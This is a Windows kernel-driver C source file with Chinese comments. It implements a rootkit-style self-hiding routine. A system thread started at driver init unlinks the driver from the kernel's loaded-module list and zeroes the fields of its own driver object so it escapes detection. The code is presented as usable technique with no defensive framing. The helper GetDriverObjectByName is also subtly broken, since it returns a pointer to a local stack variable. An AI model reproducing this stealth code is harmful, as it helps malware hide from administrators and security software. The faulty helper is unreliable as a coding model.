#include "NtDef.h"

// 获取某个驱动对象
PDRIVER_OBJECT GetDriverObjectByName(PCWSTR name) {
	DRIVER_OBJECT result = { 0 };
	UNICODE_STRING ObjectName = { 0 };
	RtlInitUnicodeString(&ObjectName, name);
	NTSTATUS ntstatus = ObReferenceObjectByName(
		&ObjectName,
		FILE_ALL_ACCESS,
		NULL,
		NULL,
		*IoDriverObjectType,
		KernelMode,
		NULL,
		(PVOID)&result
	);
	if (!NT_SUCCESS(ntstatus)) {
		return NULL;
	}
	return &result;
}

// 隐藏自身
VOID HideMySelf(PVOID StartContext) {
	// 设置定时
	LARGE_INTEGER time = { 0 };
	time.QuadPart = -10000 * 5000; // 5S

	KeDelayExecutionThread(KernelMode, FALSE, &time);

	PDRIVER_OBJECT pDriver = (PDRIVER_OBJECT)StartContext;

	// 自身断链 由于InLoadOrderLinks第一个模块是自己
	PLDR_DATA_TABLE_ENTRY pList = (PLDR_DATA_TABLE_ENTRY)pDriver->DriverSection;
	RemoveEntryList(&pList->InLoadOrderLinks);
	// 抹除特征 Type DriverSize DriverExtension DriverInit DriverSection
	pDriver->Type = 0;
	pDriver->DriverSize = 0;
	pDriver->DriverExtension = 0;
	pDriver->DriverInit = 0;
	pDriver->DriverSection = 0;
}

HANDLE ptHandle = 0;

VOID OnDriverInit(PDRIVER_OBJECT pDriver) {
	PsCreateSystemThread(
		&ptHandle,			// 线程句柄 需要通过ZwClose进行关闭
		THREAD_ALL_ACCESS,	// 线程权限
		NULL,				// 线程对象属性
		NULL,				// 进程句柄【输入参数 可选】 填空默认附加到系统进程
		NULL,				// 客户标识【输入参数 可选】
		HideMySelf,			// 线程要执行的函数
		(PVOID)pDriver		// 线程要执行的函数的参数
	);
}